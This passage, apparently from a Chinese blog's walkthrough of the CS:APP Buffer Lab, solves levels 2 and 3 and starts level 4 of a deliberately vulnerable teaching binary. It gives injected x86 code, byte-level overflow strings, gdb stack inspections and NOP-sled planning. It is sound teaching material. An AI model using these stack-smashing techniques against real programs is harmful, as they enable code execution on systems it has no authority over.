-<p>通过在gdb中添加断点并观察，我们可以确定在执行函数<code>getbuf</code>时，栈底<code>%ebp</code>的值为<code>0x55683450</code>。</p>
-<p>接下来我们要通过gcc和objdump生成攻击代码。我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，攻击代码的作用就是设置全解变量的值为cookie的值，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x52f8c747, %eax</div><div class="line">mov %eax, 0x804c1ec  ;设置全局变量</div><div class="line">add $16, %esp ;修改栈顶</div><div class="line">ret ;返回</div></pre></td></tr></table></figure>
-<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o</code>将攻击代码汇编和反汇编，具体的命令和结果如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gcc -m32 -c level2-exploit.s </div><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ objdump -d level2-exploit.o</div><div class="line"></div><div class="line">level2-exploit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 47 c7 f8 52       	mov    $0x52f8c747,%eax</div><div class="line">   5:	a3 ec c1 04 08       	mov    %eax,0x804c1ec</div><div class="line">   a:	83 c4 10             	add    $0x10,%esp</div><div class="line">   d:	c3                   	ret</div></pre></td></tr></table></figure>
-<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 34 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 47 c7 f8 52 a3 ec c1 </div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">22 90 04 08  			/* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
-<p>可以知道，我们的攻击思路是：<strong>在getbuf函数返回的时候，先将<code>pc</code>跳转到我们刚刚设计的攻击代码开始的地方，执行我们设计的攻击代码，设置全局变量的值，然后在跳转到<code>bang</code>函数执行。</strong></p>
-<p>可能疑惑为什么要这么做？是怎么知道全局变量的地址的呢？为什么要修改栈指针且要加16呢？接下来一一解答：</p>
-<p>对于全局变量的指针，我们可以通过<code>bang</code>函数的反汇编代码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">08049022 &lt;bang&gt;:</div><div class="line"> 8049022:	55                   	push   %ebp</div><div class="line"> 8049023:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049025:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049028:	a1 ec c1 04 08       	mov    0x804c1ec,%eax</div><div class="line"> 804902d:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8049033:	75 1e                	jne    8049053 &lt;bang+0x31&gt;</div><div class="line"> 8049035:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049039:	c7 04 24 90 a1 04 08 	movl   $0x804a190,(%esp)</div><div class="line"> 8049040:	e8 9b f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049045:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</div><div class="line"> 804904c:	e8 93 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8049051:	eb 10                	jmp    8049063 &lt;bang+0x41&gt;</div><div class="line"> 8049053:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049057:	c7 04 24 79 9f 04 08 	movl   $0x8049f79,(%esp)</div><div class="line"> 804905e:	e8 7d f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049063:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 804906a:	e8 21 f9 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
-<p>在level-1中我们知道<code>0x804c1e4</code>是cookie的地址，那么这里<code>0x804c1ec</code>显然就是全局变量的地址了。</p>
-<p>从getbuf返回时，我们的内存是这样的：</p>
-<p><img src="/images/CSAPP-BufferLab-04.png" alt="level-2"></p>
-<p>我们很巧妙的把pc指向了我们设置的攻击代码处，然后开始执行我们设置的代码，当指行完 <code>add    $0x10,%esp</code>的时候，内存空间是这样的：</p>
-<p><img src="/images/CSAPP-BufferLab-05.png" alt="level-2"></p>
-<p>然后执行<code>ret</code>，把栈顶的bang函数的首地址弹出给pc，在改变全局变量的值后，顺利地跳转到bang函数开始执行。</p>
-<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level2.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Bang!: You set global_value to 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
-<h4 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3 Dynamite"></a>Level 3 Dynamite</h4><p>Your job for this level is to supply an exploit string that will cause getbuf to return your cookie back to<br>test, rather than the value 1. You can see in the code for test that this will cause the program to go<br>“Boom!.” Your exploit code should set your cookie as the return value, restore any corrupted state, push<br>the correct return location on the stack, and execute a ret instruction to really return to test.</p>
-<p>在前面的几个阶段中，我们所有的攻击都导致程序跳转至其他函数并退出。所以，使用会破坏栈的攻击代码是可行的。</p>
-<p>在该阶段中，你需要修改程序的寄存器和内存状态，并且使程序能正确的返回值原调用者函数并且不出错。这就意味着我们需要做：</p>
-<ul>
-<li>在栈上执行机器代码</li>
-<li>要恢复test函数的栈帧，也就是恢复test的<code>$esp</code>和<code>%ebp</code>，让test函数能继续执行</li>
-</ul>
-<p>具体来说，你需要让函数getbuf返回cookie而不是1至函数test。注意到在test中当返回值为cookie时程序会输出”Boom!”。你的攻击代码应当将cookie设置为返回值，恢复任何被破坏的状态，将正确的返回地址push到栈上，最终执行ret指令。</p>
-<p>对于该阶段，我们的思路：和阶段2一样，通过溢出使程序跳转至栈上执行相应的攻击代码，修改返回值，修复破坏的<code>$ebp</code>,然后跳转到正确的地址</p>
-<p>攻击代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">mov $0x55683480, %ebp  /* recovery %ebp */</div><div class="line">push 0x8048c93       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure></p>
-<p>在攻击代码里，我们设置了返回值、恢复<code>%ebp</code>的值，但是并没有刻意恢复<code>$esp</code>,不过此时的<code>%esp</code>也是正确的，请各位猿友思考下这个问题。</p>
-<p>对于这么得到旧的<code>%ebp</code>和正确返回地址的值，我们可以通过gdb调试，查看内存的值得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) b getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) x /10xw $ebp</div><div class="line">0x55683450 &lt;_reserved+1037392&gt;:	0x55683480	0x08048c93	0x55686018	0x00000b60</div><div class="line">0x55683460 &lt;_reserved+1037408&gt;:	0x55685ff0	0xb7e7143f	0xb7fd1ac0	0x08049f4b</div><div class="line">0x55683470 &lt;_reserved+1037424&gt;:	0x5568348c	0x7902ca39</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>做法就是在执行getbuf函数的时候，通过查看<code>%ebp</code>后面的内存的值，能得到旧的<code>%ebp</code>的值为<code>0x55683480</code>,正确的返回地址的值<code>0x08048c93</code>，和我们设计的攻击代码里的是一一对应的。</p>
-<p>然后和阶段二一样汇编攻击代码和反汇编得到指令序列：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">level3-exlpoit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	a1 e4 c1 04 08       	mov    0x804c1e4,%eax</div><div class="line">   5:	bd 80 34 68 55       	mov    $0x55683480,%ebp</div><div class="line">   a:	ff 35 93 8c 04 08    	pushl  0x8048c93</div><div class="line">  10:	c3                   	ret</div></pre></td></tr></table></figure>
-<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a1 e4 c1 04 08 bd 80 34</div><div class="line">68 55 68 93 8c 04 08 c3</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 </div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 28 34 68 55</div></pre></td></tr></table></figure></p>
-<p>如果你看过我们阶段2的做法，会发现这里跟阶段二不一样了，我们现在把攻击代码放在了<code>buf</code>的开始位置了，因为这样能更方便的维护<code>%esp</code>。</p>
-<p>执行完<code>getbuf</code>后的内存结构:</p>
-<p><img src="/images/CSAPP-BufferLab-06.png" alt="level-3"></p>
-<p>注意到此时的<code>%esp</code>是在正确的位置的，也就是说现在的<code>%esp</code>就是函数test在调用getbuf前的值。</p>
-<p>当执行完<code>push 0x8048c93</code>，把正确的返回地址入栈，此时<code>%esp</code>减 4 ，不回稍后执行 <code>ret</code>把正确地址pop给pc时，<code>%esp</code>会加4，回到正确的位置，恢复test函数的栈帧。 </p>
-<p>当执行完<code>push 0x8048c93</code>时的内存空间：</p>
-<p><img src="/images/CSAPP-BufferLab-07.png" alt="level-3"></p>
-<p>执行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level3.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Boom!: getbuf returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
-<h4 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4 Nitroglycerin"></a>Level 4 Nitroglycerin</h4><p>For this level, we have gone the opposite direction, making the stack positions even less stable than they normally are. Hence the name “nitroglycerin”—an explosive that is notoriously unstable.</p>
-<p>When you run BUFBOMB with the command line flag “-n,” it will run in “Nitro” mode. Rather than calling<br>the function getbuf, the program calls a slightly different function getbufn:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int getbufn()</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">   char buf[512];</div><div class="line"></div><div class="line">   Gets(buf);</div><div class="line"></div><div class="line">   return 1;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这个函数与getbuf所不同的是，分配了512字节的字符数组，而调用getbufn的函数会在栈中随机分配一段存储区，这导致getbufn使用的栈基址EBP随机变化。此外，在Nitro模式运行时，bufbomb会要求提供5次输入字符串，每一次都要求getbufn的返回值为实验者的cookie。</p>
-<p>Level4的其他要求与Level3相同，但它要求提供同一个恶意代码，在getbufn被调用5次后，最终仍返回到testn函数中，且不能破坏testn的堆栈状态，并使返回值为cookie。</p>
-<p>总结一下，编写恶意代码需要满足（1）恢复testn的栈帧；（2）设置 getbufn 返回值为cookie；（3）跳转到testn中调用getbufn后的下一指令地址。</p>
-<p>首先，先说一下如何解决对于栈上地址不固定，二通过溢出输入字符串写入栈的跳转地址需要固定的问题。依据英文PDF，我们可以痛<code>nop sleds</code>的技术，大概就是：在不清楚有效机器代码的入口地址时，可以在有效机器代码前以大量的NOP机器指令填充，只要跳转地址处于这些nop 上就能到达有效机器代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">空操作指令指令格式：NOP</div><div class="line"></div><div class="line">   说明：NOP是英语“No Operation”的缩写。NOP无操作数，所以称为“空操作”。</div><div class="line"></div><div class="line">   执行NOP指令只使程序计数器PC加1，所以占用一个机器周期。</div></pre></td></tr></table></figure></p>
-<p>同时，由于栈上的机器代码是按地址由低向高顺序执行，要保证五次运行都能顺利执行有效机器代码，需要满足：<strong>跳转地址位于有效机器代码入口地址之前的nop机器指令填充区。这要求尽可能增大nop填充区，尽可能使有效机器代码段往后挪。</strong></p>
-<p>有了上面的基础，我们首先来看看getbufn的汇编代码与getbuf有什么区别！</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">08048be6 &lt;getbufn&gt;:</div><div class="line"> 8048be6:	55                   	push   %ebp</div><div class="line"> 8048be7:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048be9:	81 ec 18 02 00 00    	sub    $0x218,%esp</div><div class="line"> 8048bef:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax</div><div class="line"> 8048bf5:	89 04 24             	mov    %eax,(%esp)</div><div class="line"> 8048bf8:	e8 4d ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048bfd:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c02:	c9                   	leave  </div><div class="line"> 8048c03:	c3                   	ret    </div><div class="line"></div><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure>
-<p>发现在调用getbuf时，ebp的内容比esp内容大0x28，而在getbufn中大0x218。</p>
-<p>通过查看testn的汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">08048c1c &lt;testn&gt;:</div><div class="line"> 8048c1c:	55                   	push   %ebp</div><div class="line"> 8048c1d:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c1f:	83 ec 28             	sub    $0x28,%esp</div><div class="line"> 8048c22:	c7 45 f4 ef be ad de 	movl   $0xdeadbeef,-0xc(%ebp)</div><div class="line"> 8048c29:	e8 b8 ff ff ff       	call   8048be6 &lt;getbufn&gt;</div><div class="line"> 8048c2e:	8b 55 f4             	mov    -0xc(%ebp),%edx</div><div class="line"> 8048c31:	81 fa ef be ad de    	cmp    $0xdeadbeef,%edx</div><div class="line"> 8048c37:	74 0e                	je     8048c47 &lt;testn+0x2b&gt;</div><div class="line"> 8048c39:	c7 04 24 a8 a0 04 08 	movl   $0x804a0a8,(%esp)</div><div class="line"> 8048c40:	e8 fb fc ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 8048c45:	eb 36                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c47:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8048c4d:	75 1e                	jne    8048c6d &lt;testn+0x51&gt;</div><div class="line"> 8048c4f:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c53:	c7 04 24 d4 a0 04 08 	movl   $0x804a0d4,(%esp)</div><div class="line"> 8048c5a:	e8 81 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c5f:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)</div><div class="line"> 8048c66:	e8 79 04 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8048c6b:	eb 10                	jmp    8048c7d &lt;testn+0x61&gt;</div><div class="line"> 8048c6d:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8048c71:	c7 04 24 f7 9e 04 08 	movl   $0x8049ef7,(%esp)</div><div class="line"> 8048c78:	e8 63 fc ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8048c7d:	c9                   	leave  </div><div class="line"> 8048c7e:	c3                   	ret</div></pre></td></tr></table></figure></p>
-<p>可以知道在调用getbufn前，<code>$ebp = $esp+0x28</code>，同时也能得到正确返回地址为<code>0x8048c2e</code>,所以可构造攻击代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">leal 0x28(%esp), %ebp  /* recovery %ebp */</div><div class="line">mov 0x804c1e4, %eax   /* move cookie to %eax as return value */</div><div class="line">push $0x8048c2e       /* return address */</div><div class="line">ret</div></pre></td></tr></table></figure>
-<p>指令序列为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">8d 6c 24 28</div><div class="line">a1 e4 c1 04 08</div><div class="line">68 2e 8c 04 08</div><div class="line">c3</div></pre></td></tr></table></figure></p>
-<p>攻击代码设计好了，现在要做的就是找一个合适的地址，以确保在栈随机的情况下也能执行我们的攻击代码。现在我们就看看-n模式下getbufn的 <code>$ebp</code>是怎么变化的。</p>
-<p>使用gdb调试：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbufn</div><div class="line">Breakpoint 1 at 0x8048bef</div><div class="line">(gdb) run -n -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -n -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$1 = (void *) 0x55683450 &lt;_reserved+1037392&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683450 &lt;_reserved+1037392&gt;:	0x55683480	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:1</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$2 = (void *) 0x55683430 &lt;_reserved+1037360&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683430 &lt;_reserved+1037360&gt;:	0x55683460	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:2</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$3 = (void *) 0x55683400 &lt;_reserved+1037312&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x55683400 &lt;_reserved+1037312&gt;:	0x55683430	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:3</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$4 = (void *) 0x556833e0 &lt;_reserved+1037280&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x556833e0 &lt;_reserved+1037280&gt;:	0x55683410	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:4</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048bef in getbufn ()</div><div class="line">(gdb) print $ebp</div><div class="line">$5 = (void *) 0x556833e0 &lt;_reserved+1037280&gt;</div><div class="line">(gdb) x /4xw $ebp</div><div class="line">0x556833e0 &lt;_reserved+1037280&gt;:	0x55683410	0x08048c2e	0x55686018	0x00000b60</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line">Type string:5</div><div class="line">Dud: getbufn returned 0x1</div><div class="line">Better luck next time</div></pre></td></tr></table></figure>
-<p>通过调试得到getbufn函数的%ebp值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683450</div><div class="line">0x55683430</div><div class="line">0x55683400</div><div class="line">0x556833e0</div><div class="line">0x556833e0</div></pre></td></tr></table></figure></p>
-<p>所以我们得到字符串的存储位置为 <code>%ebp-0x208 (520)</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683248</div><div class="line">0x55683228</div><div class="line">0x556831f8</div><div class="line">0x556831d8</div><div class="line">0x556831d8</div></pre></td></tr></table></figure></p>
-<p>变化范围为:<code>0x70 (112)</code></p>
